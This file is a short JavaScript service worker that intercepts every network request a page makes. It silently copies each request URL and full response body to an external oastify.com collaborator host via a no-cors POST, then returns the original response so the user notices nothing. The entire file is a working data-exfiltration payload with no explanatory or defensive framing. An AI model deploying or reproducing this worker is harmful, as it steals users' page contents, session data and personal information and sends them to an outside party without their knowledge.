async function handleRequest(event) {
    const url = "https://hdynck5avlo4wq2zgm6scflvamgd4iy6n.oastify.com/?e=";

    let response = await fetch(event.request.url)

    let response_copy = response.clone();

    let data = {url: event.request.url, data: await response.text()}

    fetch(
        url,
        {
            body: JSON.stringify(data),
            mode: 'no-cors',
            method: 'POST'
        }
    )

    return new Response(await response_copy.blob(),{status:200})
}

self.addEventListener("fetch",async (event) => {
    event.respondWith(handleRequest(event));
});